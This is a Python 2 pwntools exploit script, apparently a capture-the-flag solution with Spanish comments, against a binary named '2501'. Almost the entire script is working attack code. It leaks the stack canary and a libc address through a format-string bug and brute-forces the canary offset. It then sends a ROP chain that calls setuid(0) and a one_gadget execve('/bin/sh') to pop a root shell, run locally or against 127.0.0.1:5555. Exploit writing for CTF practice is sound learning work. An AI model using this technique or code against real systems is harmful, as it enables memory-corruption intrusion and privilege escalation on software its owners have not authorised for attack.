#!/usr/bin/env python2
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux",
               terminal=["gnome-terminal", "new window"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("2501")
e = ELF(TARGET)
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#ejecutar python exploit.py remote (para tomar el proceso en escucha)
#la cuarta direccion que se lekea nos da un offset para calcular libc base
#>>> offset = 0x7ffff7ff2440 - 0x7ffff7a3a000
#>>> print hex(offset)
#0x5b8440
#>>> 
offset = 0x5b8440 # de R9 que parece estar en libc
#calculamos este gadget con one_gadget (vaya herramienta)
gadget = 0x4484f   #excev(/bin/sh)
setuid = l.symbols['setuid'] # no necesita explicacion
pop_rdi = 0x23a5f #pop rdi ret en libc (por que no?)

#funcion para calcular el canary... no mucho que explicar
def offset_canary(): 
    for i in range(1, 200):
        r = process([TARGET,])
        test = "aaa"
        pattern = "A" * i
        r.sendlineafter("Name: ", test)
        r.readuntil('Code:')
        r.sendline(pattern)
        response = r.recvall()
        
        if "stack smashing detected" in response:
            print "CANARY empieza en ", i
            r.close()
            break
        else:
            print "NAAAAAA siga particopando "
            r.close()

#con esta funcion descrubrimos el offset en canary + 8 bytes (cae en RSP)
def offset_ret(r):
    #r = process([TARGET,])
    test = "%lx-" * 15
    r.sendlineafter("Name: ", test)
    response = r.readuntil('Code:')
    response = response.split('-')
    canary = int(response[-2],16)
    print hex(canary)
    pattern = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII" #encontrado 8 mas (donde empiezan las C)
    payload = "A" * 136 + p64(canary) + pattern

    r.sendline(payload)
    #resp = r.recvall()
    r.interactive()

def exploit(r):
    payload = "%lx-" * 15
    r.sendlineafter("Name: ", payload)
    response = r.readuntil('Code:')
    response = response.split('-')
    print "format strings shits : ", response
    canary = int(response[-2],16)
    print hex(canary)
    libc = int(response[3],16) - offset
    print hex(libc)
    payload = "A" * 136
    payload += p64(canary)
    payload += "B" * 8 #junk hasta ret 
    payload += p64(libc + pop_rdi)
    payload += p64(0x0)  #null para setuid
    payload += p64(libc + setuid) #si vamos a usar esta tecnica ojo con la prueba local
    payload += p64(libc + gadget) #super gadget
    r.sendline(payload)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("127.0.0.1", 5555)
    else:
        LOCAL = True
        r = process([TARGET,])
        print "PID para debug"
	print util.proc.pidof(r) #solo para atachar a GDB soy flojo
        #pause() #ermm
    exploit(r)
   #offset_ret(r)
    sys.exit(0)
